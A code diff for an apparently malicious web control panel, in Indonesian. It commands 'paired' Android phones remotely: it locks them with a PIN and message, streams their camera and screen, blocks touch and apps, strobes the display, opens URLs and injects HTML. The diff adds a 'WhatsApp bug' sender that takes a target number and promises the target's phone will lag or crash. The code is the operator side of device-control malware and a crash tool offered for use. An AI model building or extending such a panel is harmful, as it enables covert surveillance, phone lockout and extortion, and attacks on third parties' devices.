+  if(S.devices.length===0){
+    l.innerHTML = '<p style="text-align:center;padding:20px;color:#884444;font-size:12px;letter-spacing:2px">Belum ada device terpairing.</p>';
     return;
   }
-  l.innerHTML = S.devices.map((d,i) => `
-    <div class="dcard">
-      <div class="dinfo">
+  l.innerHTML = S.devices.map((d,i)=>`
+    <div class="device-card">
+      <div class="device-info">
         <svg viewBox="0 0 24 24"><rect x="6" y="2" width="12" height="20" rx="2"/><circle cx="12" cy="18" r="1"/></svg>
-        <div class="dmeta"><h3>${d.name}</h3><p>ID: ${d.id} • ${d.os}</p></div>
+        <div>
+          <h3>${d.name}</h3>
+          <p>ID: ${d.id} • ${d.os||'Android'}</p>
+        </div>
       </div>
-      <button onclick="openDash(${i})">OPEN</button>
+      <button class="open-btn" onclick="openDash(${i})">OPEN</button>
     </div>`).join('');
 }
-
-/* ============================================================
-   DASHBOARD
-============================================================ */
 function openDash(i){
   S.active = S.devices[i];
-  document.getElementById('mainPage').style.display = 'none';
-  document.getElementById('dash').style.display = 'block';
-  document.getElementById('dName').textContent = S.active.name;
-  document.getElementById('dId').textContent = 'ID: ' + S.active.id;
-}
-function backMain(){
-  document.getElementById('dash').style.display = 'none';
-  document.getElementById('mainPage').style.display = 'block';
-  S.active = null;
-  stopPrev();
+  document.getElementById('dashName').textContent = S.active.name;
+  showScreen('screenDash');
 }
 
-/* ============================================================
-   FITUR MODAL
-============================================================ */
+/* ============ FITUR ============ */
 function openF(k){
   document.getElementById('mov').classList.add('active');
-  const f = S.f[k]; let h = '';
-
-  if (k === 'lock') h = `<h2>1. LOCK</h2>
+  const f = S.f[k]; let h='';
+  if(k==='lock') h=`<h2>LOCK</h2>
     <div class="trow"><span>Aktifkan</span><div class="tog ${f.active?'on':''}" onclick="tog('lock',this)"></div></div>
-    <label>PIN</label><input id="i-pin" value="${f.pin}" maxlength="6" placeholder="1234">
-    <div class="trow" style="margin-top:14px"><span>Auto-Lock boot</span><div class="tog ${f.autoLock?'on':''}" onclick="togSub('lock','autoLock',this)"></div></div>`;
-
-  if (k === 'lockmsg') h = `<h2>2. LOCK + PESAN</h2>
+    <label>PIN</label><input id="i-pin" value="${f.pin}" maxlength="6">`;
+  if(k==='lockmsg') h=`<h2>LOCK + PESAN</h2>
     <div class="trow"><span>Aktifkan</span><div class="tog ${f.active?'on':''}" onclick="tog('lockmsg',this)"></div></div>
     <label>PIN</label><input id="i-pin" value="${f.pin}" maxlength="6">
     <label>Pesan</label><textarea id="i-msg">${f.message}</textarea>`;
-
-  if (k === 'camera') h = `<h2>3. LIVE CAMERA</h2>
+  if(k==='camera') h=`<h2>LIVE CAMERA</h2>
     <div class="trow"><span>Aktifkan</span><div class="tog ${f.active?'on':''}" onclick="tog('camera',this);startCam()"></div></div>
-    <label>Kamera</label><select id="i-facing"><option value="front" ${f.facing==='front'?'selected':''}>Depan</option><option value="back" ${f.facing==='back'?'selected':''}>Belakang</option></select>
+    <label>Kamera</label><select id="i-facing"><option value="front">Depan</option><option value="back">Belakang</option></select>
     <div class="cview"><video id="camV" autoplay playsinline muted></video></div>`;
-
-  if (k === 'customhtml') h = `<h2>4. CUSTOM HTML</h2>
+  if(k==='customhtml') h=`<h2>CUSTOM HTML</h2>
     <div class="trow"><span>Aktifkan</span><div class="tog ${f.active?'on':''}" onclick="tog('customhtml',this)"></div></div>
     <label>HTML</label><textarea id="i-html">${f.html}</textarea>`;
-
-  if (k === 'strobe') h = `<h2>5. STROBE</h2>
+  if(k==='strobe') h=`<h2>STROBE</h2>
     <div class="trow"><span>Aktifkan</span><div class="tog ${f.active?'on':''}" onclick="tog('strobe',this)"></div></div>
-    <label>Kecepatan</label><select id="i-speed"><option value="slow" ${f.speed==='slow'?'selected':''}>Lambat</option><option value="fast" ${f.speed==='fast'?'selected':''}>Cepat</option><option value="turbo" ${f.speed==='turbo'?'selected':''}>Turbo</option></select>`;
-
-  if (k === 'screen') h = `<h2>6. LIVE SCREEN</h2>
+    <label>Kecepatan</label><select id="i-speed"><option value="slow">Lambat</option><option value="fast" selected>Cepat</option><option value="turbo">Turbo</option></select>`;
+  if(k==='screen') h=`<h2>LIVE SCREEN</h2>
     <div class="trow"><span>Aktifkan</span><div class="tog ${f.active?'on':''}" onclick="tog('screen',this);startScr()"></div></div>
     <div class="cview"><video id="scrV" autoplay playsinline muted></video></div>`;
-
-  if (k === 'blocktouch') h = `<h2>7. BLOCK TOUCH</h2>
+  if(k==='blocktouch') h=`<h2>BLOCK TOUCH</h2>
     <div class="trow"><span>Aktifkan</span><div class="tog ${f.active?'on':''}" onclick="tog('blocktouch',this)"></div></div>
     <label>Durasi (menit)</label><input id="i-dur" type="number" value="${f.duration}" min="1" max="120">`;
-
-  if (k === 'lcdeffect') h = `<h2>8. LCD EFFECT</h2>
+  if(k==='lcdeffect') h=`<h2>LCD EFFECT</h2>
     <div class="trow"><span>Aktifkan</span><div class="tog ${f.active?'on':''}" onclick="tog('lcdeffect',this)"></div></div>`;
-
-  if (k === 'blockapp') h = `<h2>9. BLOKIR APP</h2>
+  if(k==='blockapp') h=`<h2>BLOKIR APP</h2>
     <div class="trow"><span>Aktifkan</span><div class="tog ${f.active?'on':''}" onclick="tog('blockapp',this)"></div></div>
-    <label>Package / Nama App</label><input id="i-app" value="${f.app}" placeholder="com.whatsapp">
-    <label>Pesan</label><input id="i-bmsg" value="${f.message}">
-    <div class="mact"><button class="warn" onclick="sendBlock()">BLOKIR +</button></div>`;
-
-  if (k === 'openweb') h = `<h2>10. BUKA WEB</h2>
+    <label>Package</label><input id="i-app" value="${f.app}" placeholder="com.whatsapp">
+    <label>Pesan</label><input id="i-bmsg" value="${f.message}">`;
+  if(k==='openweb') h=`<h2>BUKA WEB</h2>
     <div class="trow"><span>Aktifkan</span><div class="tog ${f.active?'on':''}" onclick="tog('openweb',this)"></div></div>
-    <label>URL</label><input id="i-url" value="${f.url}" placeholder="https://">
-    <div class="mact"><button onclick="sendWeb()">KIRIM</button></div>`;
-
-  if (k === 'wallpaper') h = `<h2>11. WALLPAPER LCD</h2>
+    <label>URL</label><input id="i-url" value="${f.url}" placeholder="https://">`;
+  if(k==='wallpaper') h=`<h2>WALLPAPER LCD</h2>
     <div class="trow"><span>Aktifkan</span><div class="tog ${f.active?'on':''}" onclick="tog('wallpaper',this)"></div></div>`;
-
-  h += `<div class="mact"><button onclick="closeM()">TUTUP</button><button onclick="apply('${k}')">TERAPKAN</button></div>`;
+  h+=`<div class="mact"><button onclick="closeM()">TUTUP</button><button class="primary" onclick="apply('${k}')">TERAPKAN</button></div>`;
   document.getElementById('modal').innerHTML = h;
-
-  if (k === 'camera' && f.active) startCam();
-  if (k === 'screen' && f.active) startScr();
+  if(k==='camera'&&f.active) startCam();
+  if(k==='screen'&&f.active) startScr();
 }
 function closeM(){
   document.getElementById('mov').classList.remove('active');
-  stopPrev();
+  if(camStream){camStream.getTracks().forEach(t=>t.stop());camStream=null;}
+  if(screenStream){screenStream.getTracks().forEach(t=>t.stop());screenStream=null;}
 }
-
-/* ============================================================
-   TOGGLE
-============================================================ */
-function tog(k, el){
-  S.f[k].active = !S.f[k].active;
+function tog(k,el){
+  S.f[k].active=!S.f[k].active;
   el.classList.toggle('on');
   upBadge(k);
-  send(k, { active: S.f[k].active });
-  log('[' + k + '] ' + (S.f[k].active ? 'ON' : 'OFF'));
+  send(k,{active:S.f[k].active});
 }
-function togSub(k, s, el){ S.f[k][s] = !S.f[k][s]; el.classList.toggle('on'); }
 function upBadge(k){
-  const b = document.getElementById('b-' + k);
-  if (!b) return;
-  b.textContent = S.f[k].active ? 'ON' : 'OFF';
-  b.classList.toggle('on', S.f[k].active);
-  b.classList.toggle('off', !S.f[k].active);
+  const b=document.getElementById('b-'+k); if(!b)return;
+  b.textContent=S.f[k].active?'ON':'OFF';
+  b.classList.toggle('on',S.f[k].active);
+  b.classList.toggle('off',!S.f[k].active);
 }
-
-/* ============================================================
-   APPLY
-============================================================ */
 function apply(k){
-  const f = S.f[k];
-  const v = (id) => { const e = document.getElementById(id); return e ? e.value : ''; };
-  if (k === 'lock'){ f.pin = v('i-pin'); }
-  if (k === 'lockmsg'){ f.pin = v('i-pin'); f.message = v('i-msg'); }
-  if (k === 'camera'){ f.facing = v('i-facing'); }
-  if (k === 'customhtml'){ f.html = v('i-html'); }
-  if (k === 'strobe'){ f.speed = v('i-speed'); }
-  if (k === 'blocktouch'){ f.duration = parseInt(v('i-dur')) || 5; }
-  if (k === 'blockapp'){ f.app = v('i-app'); f.message = v('i-bmsg'); }
-  if (k === 'openweb'){ f.url = v('i-url'); }
-  send(k, f);
-  log('APPLY ' + k);
+  const f=S.f[k];
+  const v=(id)=>document.getElementById(id)?.value;
+  if(k==='lock') f.pin=v('i-pin');
+  if(k==='lockmsg'){f.pin=v('i-pin');f.message=v('i-msg');}
+  if(k==='camera') f.facing=v('i-facing');
+  if(k==='customhtml') f.html=v('i-html');
+  if(k==='strobe') f.speed=v('i-speed');
+  if(k==='blocktouch') f.duration=parseInt(v('i-dur'))||5;
+  if(k==='blockapp'){f.app=v('i-app');f.message=v('i-bmsg');}
+  if(k==='openweb') f.url=v('i-url');
+  send(k,f);
   closeM();
 }
-function sendBlock(){
-  const a = document.getElementById('i-app').value;
-  const m = document.getElementById('i-bmsg').value;
-  S.f.blockapp.app = a;
-  S.f.blockapp.message = m;
-  send('blockapp', { app: a, message: m, active: true });
-  log('Blokir: ' + a);
+async function send(feature,data){
+  if(!S.active) return;
+  await fetch('/api/command',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({device:S.active.id,feature,data})
+  });
 }
-function sendWeb(){
-  const u = document.getElementById('i-url').value;
-  S.f.openweb.url = u;
-  send('openweb', { url: u, active: true });
-  log('Open web: ' + u);
-}
-
-/* ============================================================
-   SEND COMMAND
-============================================================ */
-async function send(feature, data){
-  if (!S.active){ log('No device'); return; }
-  try {
-    await fetch('/api/command', {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ device: S.active.id, feature, data })
-    });
-    log('>> ' + feature);
-  } catch(e){ log('Send error: ' + e.message); }
-}
-
-/* ============================================================
-   PREVIEW (LOCAL)
-============================================================ */
 async function startCam(){
-  stopPrev();
-  try {
-    camStream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode: S.f.camera.facing } });
-    const v = document.getElementById('camV');
-    if (v) v.srcObject = camStream;
-  } catch(e){ log('cam err ' + e.message); }
+  try{
+    camStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:S.f.camera.facing}});
+    const v=document.getElementById('camV'); if(v)v.srcObject=camStream;
+  }catch(e){}
 }
 async function startScr(){
-  stopPrev();
-  try {
-    screenStream = await navigator.mediaDevices.getDisplayMedia({ video:true });
-    const v = document.getElementById('scrV');
-    if (v) v.srcObject = screenStream;
-  } catch(e){ log('scr err ' + e.message); }
-}
-function stopPrev(){
-  if (camStream){ camStream.getTracks().forEach(t => t.stop()); camStream = null; }
-  if (screenStream){ screenStream.getTracks().forEach(t => t.stop()); screenStream = null; }
+  try{
+    screenStream=await navigator.mediaDevices.getDisplayMedia({video:true});
+    const v=document.getElementById('scrV'); if(v)v.srcObject=screenStream;
+  }catch(e){}
 }
 
-/* ============================================================
-   LOG
-============================================================ */
-function log(m){
-  const a = document.getElementById('log');
-  if (!a) return;
-  const p = document.createElement('p');
-  p.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;
-  a.appendChild(p);
-  a.scrollTop = a.scrollHeight;
+/* ============ WHATSAPP BUG MENU ============ */
+function selectBug(el){
+  document.querySelectorAll('.bug-card').forEach(c=>{
+    c.classList.remove('selected');
+    c.querySelector('.check').textContent='';
+  });
+  el.classList.add('selected');
+  el.querySelector('.check').textContent='✓';
+  S.selectedBug = el.dataset.bug;
 }
-
-/* ============================================================
-   BOOT
-============================================================ */
-(function boot(){
-  const user = localStorage.getItem('lyx_login');
-  if (user){
-    enterPanel();
-  } else {
-    showPage('login');
+function selectSender(el){
+  document.querySelectorAll('.sender-card').forEach(c=>c.classList.remove('selected'));
+  el.classList.add('selected');
+  S.selectedSender = el.dataset.sender;
+}
+async function sendBug(){
+  const num = document.getElementById('waNumber').value.trim();
+  if (!num || num.length < 8){
+    alert('Masukin nomor WhatsApp target dengan format 628xxxxxxxxxx');
+    return;
   }
-})();
+  const overlay = document.getElementById('loadingOverlay');
+  overlay.classList.add('active');
+  let cd = 4;
+  document.getElementById('countdown').textContent = cd;
+  const iv = setInterval(()=>{
+    cd--;
+    document.getElementById('countdown').textContent = cd;
+    if (cd <= 0){ clearInterval(iv); }
+  }, 1000);
+  setTimeout(async ()=>{
+    overlay.classList.remove('active');
+    // Kirim command ke target
+    if (S.active){
+      await send('whatsappbug',{
+        number:num,
+        bug:S.selectedBug,
+        sender:S.selectedSender
+      });
+    }
+    alert('BUG TERKIRIM KE ' + num + '\nTarget akan lag/crash dalam beberapa detik 😈');
+  }, 4000);
+}
+
+/* ============ BOOT ============ */
+const cur = localStorage.getItem('lyx_current');
+if (cur){
+  const saved = JSON.parse(localStorage.getItem('lyx_user_'+cur) || '{}');
+  S.user = cur;
+  S.since = saved.since;
+  enterPanel();
+}
 </script>
 </body>
 </html>
